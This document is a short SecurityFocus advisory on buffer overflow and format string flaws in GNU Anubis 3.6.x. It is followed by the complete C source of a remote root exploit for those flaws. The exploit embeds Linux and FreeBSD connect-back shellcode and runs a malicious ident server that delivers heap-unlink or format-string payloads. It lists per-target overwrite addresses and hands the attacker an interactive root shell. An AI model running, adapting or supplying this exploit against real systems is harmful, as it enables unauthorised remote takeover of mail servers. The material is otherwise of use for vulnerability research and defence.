source: http://www.securityfocus.com/bid/9772/info
 
GNU Anubis has been reported prone to multiple buffer overflow and format string vulnerabilities. It has been conjectured that a remote attacker may potentially exploit these vulnerabilities to have arbitrary code executed in the context of the Anubis software. The buffer overflow vulnerabilities exist in the 'auth_ident' function in 'auth.c'. The format string vulnerabilities are reported to affect the 'info' function in 'log.c', the 'anubis_error' function in 'errs.c' and the 'ssl_error' function in 'ssl.c'.
 
These vulnerabilities have been reported to exist in GNU Anubis versions 3.6.0, 3.6.1, 3.6.2, 3.9.92, and 3.9.93. It is possible that other versions are affected as well.
 
These issues are undergiong further analysis, they will be divided into separate BIDs as analysis is completed.

/*
 * anubisexp.c
 *
 * GNU Anubis 3.6.2 remote root exploit by CMN
 *
 * <cmn at darklab.org>, <cmn at 0xbadc0ded.org>
 * Bug found by Ulf Harnhammar.
 *
 * 2004-03-10
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DUMMY            0x41414141
#define BUFSIZE          512
#define AUTH_PORT        113
#define ANUBIS_PORT      24
#define IP_INDEX         5
#define PORT_INDEX       11

#define PREV_INUSE       0x1
#define IS_MMAP          0x2
#define NON_MAIN_ARENA   0x4
#define FMTSTR           0x1
#define OVERFLOW         0x2

#define JMPCODE          "\xeb\x0c"

static int connect_target = 0;
static int start_auth = 0;

    /* Connect back */
static char linux_code[] =
    "\x31\xc0\x50\x50\x68\xc0\xa8\x01\x01\x66\x68\x30\x39\xb0\x02"
    "\x66\x50\x89\xe6\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x31\xdb\x43"
    "\x30\xe4\xb0\x66\xcd\x80\x89\xc5\x6a\x10\x56\x55\x89\xe1\xb3"
    "\x03\xb0\x66\xcd\x80\x89\xeb\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
    "\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xd2\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
    "\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

    /* Connect back */
static char freebsd_code[] =
    "\x31\xc0\x50\x50\x68\xc0\xa8\x01\x01\x66\x68\x30\x39\xb4\x02"
    "\x66\x50\x89\xe2\x66\x31\xc0\x50\x40\x50\x40\x50\x50\x30\xe4"
    "\xb0\x61\xcd\x80\x89\xc7\x31\xc0\xb0\x10\x50\x52\x57\x50\xb0"
    "\x62\xcd\x80\x50\x57\x50\xb0\x5a\xcd\x80\xb0\x01\x50\x57\x50"
    "\x83\xc0\x59\xcd\x80\xb0\x02\x50\x57\x50\x83\xc0\x58\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x50\x53\x89\xe2\x50\x52\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x40"
    "\x50\x50\xcd\x80";

struct target {
    char type;
    char *desc;
    char *code;
    u_int bufaddr;  /* static buf on line 266 in net.c, used by recv() */
    u_int retloc;
    u_int offset;
    u_int written;
    u_int pad;
};


struct target targets[] = {
    /* .GOT free */
    { OVERFLOW, "Linux anubis-3.6.2-1.i386.rpm [glibc < 3.2.0] (overflow)",
        linux_code, 0x08056520, 0x08056464, 305, 0x00, 0x00 },

    /* .GOT strlen */
    { FMTSTR, "Linux anubis-3.6.2-1.i386.rpm (fmt, verbose)", linux_code,
        0x08056520, 0x080563bc, 10*4, 32, 1 },

    /* .dtors */
    { FMTSTR, "FreeBSD anubis-3.6.2_1.tgz (fmt)", freebsd_code,
        0x805db80, 0x0805cc10+4, 12*4, 20, 1 },

    /* .GOT getpwnam */
    { FMTSTR, "FreeBSD anubis-3.6.2_1.tgz (fmt, verbose)", freebsd_code,
        0x805db80, 0x0805ce18, 15*4, 32, 1 },

    { -1, NULL, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
};


int
sock_connect(u_long ip, u_short port)
{
    struct sockaddr_in taddr;
    int sock_fd;

    memset(&taddr, 0x00, sizeof(struct sockaddr_in));
    taddr.sin_addr.s_addr = ip;
    taddr.sin_port = port;
    taddr.sin_family = AF_INET;

    if ( (sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        return(-1);
    }

    if (connect(sock_fd, (struct sockaddr *)&taddr,
            sizeof(taddr)) < 0) {
        perror("** connect()");
        return(-1);
    }
    return(sock_fd);
}


long
net_inetaddr(u_char *host)
{
    long haddr;
    struct hostent *hent;

    if ( (haddr = inet_addr(host)) < 0) {
        if ( (hent = gethostbyname(host)) == NULL)
            return(-1);

        memcpy(&haddr, (hent->h_addr), 4);
    }
    return(haddr);
}

long
net_localip(void)
{
    u_char lname[MAXHOSTNAMELEN +1];
    struct in_addr addr;
    memset(lname, 0x00, sizeof(lname));

    if ( gethostname(lname, MAXHOSTNAMELEN) < 0)
        return(-1);

    addr.s_addr = net_inetaddr(lname);
    return(addr.s_addr);
}


char *
unlinkchunk(u_int ret, u_int retloc, size_t words)
{
    u_int *chunk;
    size_t i=0;

    if (words < 14) {
        fprintf(stderr, "unlinkchunk(): Small buffer\n");
        return(NULL);
    }

    if ( (chunk = calloc(words*sizeof(u_int)+1, 1)) == NULL) {
        perror("calloc()");
        return(NULL);
    }

    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = ret;
    chunk[i++] = retloc-8;

    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = ret;
    chunk[i++] = retloc-8;

    for (; i<words; i++) {

        /* Relative negative offset to first chunk */
        if (i % 2)
            chunk[i] = ((-(i-8)*4) & ~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE;
        /* Relative negative offset to second chunk */
        else
            chunk[i] = ((-(i-3)*4) & ~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE;
    }
    return((char *)chunk);
}

int
mkfmtstr(struct target *tgt, u_int ret,
        char *buf, size_t buflen)
{
    size_t pad;
    size_t espoff;
    size_t written;
    int tmp;
    int wb;
    int i;

    if (buflen < 50) {
        fprintf(stderr, "mkfmtstr(): small buffer\n");
        return(-1);
    }
    memset(buf, 'P', tgt->pad % 4);
    buf += tgt->pad % 4;
    written = tgt->written;

    /* Add dummy/retloc pairs */
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+1;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+2;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+3;
    buf += 8;
    buflen -= 32;
    written += 32;

    /* Stackpop */
    for (espoff = tgt->offset; espoff > 0; espoff -= 4) {
        snprintf(buf, buflen, "%%08x");
        buflen -= strlen("%08x");
        buf += strlen("%08x");
        written += 8;
    }

    /* Return address */
    for (i=0; i<4; i++) {
        wb = ((u_char *)&ret)[i] + 0x100;
        written %= 0x100;
        pad = (wb - written) % 0x100;
        if (pad < 10)
                pad += 0x100;
        tmp = snprintf(buf, buflen,
            "%%%du%%n", pad);
        written += pad;
        buflen -= tmp;
        buf += tmp;
    }

    return(buflen >= 0 ? written : -1);
}


int
evil_auth(u_short port, char *ident, size_t identlen)
{
    struct sockaddr_in client;
    struct sockaddr_in laddr;
    u_int addrlen = sizeof(struct sockaddr_in);
    int lsock, csock;
    char input[128];

    if ( (lsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        return(-1);
    }

    memset(&laddr, 0x00, sizeof(struct sockaddr_in));
    laddr.sin_family = AF_INET;
    laddr.sin_port = port;
    laddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(lsock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        perror("** bind()");
        return(-1);
    }

    if (listen(lsock, 1) < 0) {
        perror("** listen()");
        return(-1);
    }

    printf("[*] Awaiting auth connection\n");
    if ( (csock = accept(lsock, (struct sockaddr *)&client,
            &addrlen)) < 0) {
        fprintf(stderr, "** Connection error\n");
        return(-1);
    }

    if (getpeername(csock, (struct sockaddr *)&client, &addrlen) < 0)
        perror("** getpeername()");
    else
        printf("[*] %s:%u connected to auth\n",
            inet_ntoa(client.sin_addr), ntohs(client.sin_port));

    if (read(csock, input, sizeof(input)) <= 0) {
        perror("** write()");
        return(1);
    }

    printf("[*] Sending evil ident\n");

    if (write(csock, ident, identlen) != identlen) {
        perror("** write()");
        return(1);
    }

    if (close(csock) < 0 || close(lsock < 0)) {
        perror("** close()");
        return(1);
    }

    return(0);
}

void
signal_handler(int signo)
{
    if (signo == SIGUSR1) {
        start_auth++;
        connect_target++;
    }
    else if (signo == SIGALRM) {
        fprintf(stderr, "** Timed out while waiting for connect back\n");
        kill(0, SIGTERM);
        exit(EXIT_FAILURE);
    }
}


int
get_connectback(pid_t conn, int lsock)
{
    char inbuf[8192];
    u_int addrlen = sizeof(struct sockaddr_in);
    struct sockaddr_in client;
    int csock;
    fd_set readset;
    ssize_t n;
    int nfd;

    if (listen(lsock, 1) < 0) {
        perror("** listen()");
        return(-1);
    }

    /* Timeout */
    signal(SIGALRM, signal_handler);
    alarm(5);

    /* Signal connect */
    kill(conn, SIGUSR1);
    waitpid(conn, NULL, 0);

    printf("[*] Awaiting connect back\n");
    if ( (csock = accept(lsock, (struct sockaddr *)&client,
            &addrlen)) < 0) {
        fprintf(stderr, "** Connection error\n");
        return(-1);
    }
    alarm(0);
    printf("[*] Target connected back\n\n");
    wait(NULL); /* Reap of last child */
    write(csock, "id\n", 3);

    if ( (nfd = csock +1) > FD_SETSIZE) {
        fprintf(stderr, "** SASH Error: FD_SETSIZE to small!\r\n");
        return(1);
    }

    FD_ZERO(&readset);
    FD_SET(csock, &readset);
    FD_SET(STDIN_FILENO, &readset);

    for (;;) {
        fd_set readtmp;
        memcpy(&readtmp, &readset, sizeof(readtmp));
        memset(inbuf, 0x00, sizeof(inbuf));

        if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
            if (errno == EINTR)
                continue;
            perror("select()");
            return(1);
        }

        if (FD_ISSET(STDIN_FILENO, &readtmp)) {
            if ( (n = read(STDOUT_FILENO, inbuf, sizeof(inbuf))) < 0) {
                perror("read()");
                break;
            }
            if (n == 0) break;
            if (write(csock, inbuf, n) != n) {
                perror("write()");
                return(1);
            }
        }

        if (FD_ISSET(csock, &readtmp)) {
            if ( (n = read(csock, inbuf, sizeof(inbuf))) < 0) {
                perror("read()");
                break;
            }
            if (n == 0) break;
            if (write(STDOUT_FILENO, inbuf, n) != n) {
                perror("write()");
                return(1);
            }
        }
    }
    return(0);
}


void
usage(char *pname)
{
    int i;

    printf("\nUsage: %s host[:port] targetID [Option(s)]\n", pname);
    printf("\n  Targets:\n");
    for (i=0; targets[i].desc != NULL; i++)
        printf("     %d   -   %s\n", i, targets[i].desc);
    printf("\n  Options:\n");
    printf("    -b ip[:port]  - Local connect back address\n");
    printf("    -l retloc     - Override target retloc\n");
    printf("    -r ret        - Override target ret\n");
    printf("    -w written    - Bytes written by target fmt func\n");
    printf("\n");
}


int
main(int argc, char *argv[])
{
    u_char buf[BUFSIZE+1];
    u_char fmt[220];
    char *chunk = NULL;
    struct sockaddr_in taddr;
    struct sockaddr_in laddr;
    u_short auth_port;
    struct target *tgt;
    pid_t pid1, pid2;
    u_int ret = 0;
    int lsock;
    char *pt;
    int i;


    printf("\n     GNU Anubis 3.6.2 remote root exploit by CMN\n");
    if (argc < 3) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");

    memset(&taddr, 0x00, sizeof(struct sockaddr_in));
    taddr.sin_port = htons(ANUBIS_PORT);
    taddr.sin_family = AF_INET;
    taddr.sin_addr.s_addr = INADDR_ANY;
    auth_port = htons(AUTH_PORT);

    memset(&laddr, 0x00, sizeof(struct sockaddr_in));
    laddr.sin_family = AF_INET;
    laddr.sin_port = 0;
    laddr.sin_addr.s_addr = net_localip();

    if ( (pt = strchr(argv[1], ':'))) {
        *pt++ = '\0';
        taddr.sin_port = htons((u_short)strtoul(pt, NULL, 0));
    }

    if ( (long)(taddr.sin_addr.s_addr = net_inetaddr(argv[1])) == -1) {
        fprintf(stderr, "Failed to resolve target host/IP\"%s\"\n",
            argv[1]);
         exit(EXIT_FAILURE);
    }
    argv++;
    argc--;

    i = strtoul(argv[1], NULL, 0);
    if (argv[1][0] == '-'|| (i<0) ||
             i>= sizeof(targets)/sizeof(struct target)-1) {
        fprintf(stderr, "** Bad target ID\n");
        exit(EXIT_FAILURE);
    }
    argv++;
    argc--;

    tgt = &targets[i];

    while ( (i = getopt(argc, argv, "r:l:w:b:")) != -1) {
        switch(i) {
            case 'b': {

                if ( (pt = strchr(optarg, ':'))) {
                    *pt++ = '\0';
                    laddr.sin_port = htons((u_short)strtoul(optarg,
                        NULL, 0));
                }

                if ( (long)(laddr.sin_addr.s_addr = net_inetaddr(optarg))
                        == -1) {
                    fprintf(stderr, "Failed to resolve target host/IP
                        \"%s\"\n", optarg);
                    exit(EXIT_FAILURE);
                }
            }
            case 'r': ret = strtoul(optarg, NULL, 0); break;
            case 'l': tgt->retloc = strtoul(optarg, NULL, 0); break;
            case 'w': tgt->written = strtoul(optarg, NULL, 0); break;
            default: exit(EXIT_FAILURE);
        }
    }


    /* Local address */
    if ( (lsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        exit(EXIT_FAILURE);
    }

    if (bind(lsock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        perror("** bind()");
        exit(EXIT_FAILURE);
    }

    /* Connect back address */
    {
        int len = sizeof(struct sockaddr_in);
        struct sockaddr_in paddr;
        if (getsockname(lsock, (struct sockaddr *)&paddr, &len) < 0) {
            perror("** getsockname()");
            exit(EXIT_FAILURE);
        }
        (*(u_short *)&tgt->code[PORT_INDEX]) = paddr.sin_port;
        (*(u_int *)&tgt->code[IP_INDEX]) = paddr.sin_addr.s_addr;

        printf("local addr: %s:%u\n", inet_ntoa(paddr.sin_addr),
            ntohs(paddr.sin_port));

        if (!(paddr.sin_port & 0xff00) || !(paddr.sin_port & 0xff00) ||
            !(paddr.sin_addr.s_addr & 0xff000000) ||
            !(paddr.sin_addr.s_addr & 0x00ff0000) ||
            !(paddr.sin_addr.s_addr & 0x0000ff00) ||
            !(paddr.sin_addr.s_addr & 0x000000ff)) {
            fprintf(stderr, "** Zero byte(s) in connect back address\n");
            exit(EXIT_FAILURE);
        }
    }

    /*
     * We insert a '\n' to control the size of the data
     * passed on the the vulnerable function.
     * But all 512 bytes are read into a static buffer, so we
     * just add the shellcode after '\n' to store it.
     */
    if (tgt->type == FMTSTR) {
        if (!ret)
            ret = tgt->bufaddr+260;

        if (mkfmtstr(tgt, ret, fmt, sizeof(fmt)) < 0)
            exit(EXIT_FAILURE);
        memset(buf, 0x90, sizeof(buf));
        memcpy(&buf[BUFSIZE-strlen(tgt->code)-4],
            tgt->code, strlen(tgt->code)+1);
        i = snprintf(buf, sizeof(buf), "a: USERID: a: %s\n", fmt);
        if (buf[i] == '\0') buf[i] = 0x90;
    }
    else {

        if (!ret)
            ret = tgt->bufaddr+tgt->offset+24;
        memset(buf, 0x90, sizeof(buf));

        memcpy(&buf[sizeof(buf)-strlen(tgt->code)-4],
            tgt->code, strlen(tgt->code)+1);

        if ( (chunk = unlinkchunk(ret, tgt->retloc, 64/4)) == NULL)
            exit(EXIT_FAILURE);

        i = snprintf(buf, sizeof(buf), "a: USERID: a:   %s", chunk);
        if (buf[i] == '\0') buf[i] = 0x90;

        /* Set free address */
        *((u_int *)&buf[tgt->offset]) = tgt->bufaddr + 68;

        /* Return point */
        memcpy(&buf[(tgt->offset+24)], JMPCODE, sizeof(JMPCODE)-1);
        buf[tgt->offset+4] = '\n';
    }

    printf("    Target: %s\n", tgt->desc);
    printf("    Return: 0x%08x\n", ret);
    printf("    Retloc: 0x%08x\n", tgt->retloc);
    if (tgt->type == FMTSTR) {
        printf("    offset: %u bytes%s\n", tgt->offset,
            tgt->offset==1?"s":"");
        printf("   Padding: %u byte%s\n", tgt->pad,
            tgt->pad==1?"s":"");
        printf("   Written: %u byte%s\n", tgt->written,
            tgt->written==1?"s":"");
    }
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n");

    if (!(ret & 0xff000000) ||
        !(ret & 0x00ff0000) ||
        !(ret & 0x0000ff00) ||
        !(ret & 0x000000ff)) {

        fprintf(stderr, "** Zero byte(s) in return address\n");
        exit(EXIT_FAILURE);
    }

    if (!(tgt->retloc & 0xff000000) ||
        !(tgt->retloc & 0x00ff0000) ||
        !(tgt->retloc & 0x0000ff00) ||
        !(tgt->retloc & 0x000000ff)) {

        fprintf(stderr, "** Zero byte(s) in retloc\n");
        exit(EXIT_FAILURE);
    }

    signal(SIGUSR1, signal_handler);

    if ( (pid1 = fork()) < 0) {
        perror("** fork()");
        exit(EXIT_FAILURE);
    }

    /* Auth server */
    if (pid1 == 0) {
        kill(getppid(), SIGUSR1);
        signal(SIGUSR1, signal_handler);
        while (!start_auth);
        if (evil_auth(auth_port, buf, strlen(buf)) != 0)
            kill(getppid(), SIGTERM);
            exit(EXIT_SUCCESS);
    }

    if ( (pid2 = fork()) < 0) {
        perror("** fork()");
        kill(pid1, SIGTERM);
        exit(EXIT_FAILURE);
    }

    /* Connect to trigger */
    if (pid2 == 0) {
        int anubis_sock;

        signal(SIGUSR1, signal_handler);
        while (!connect_target);
        if ( (anubis_sock = sock_connect(taddr.sin_addr.s_addr,
                taddr.sin_port)) < 0) {
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }

    /* Start auth */
    while(!start_auth);
    kill(pid1, SIGUSR1);

    if (get_connectback(pid2, lsock) < 0) {
        kill(0, SIGTERM);
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}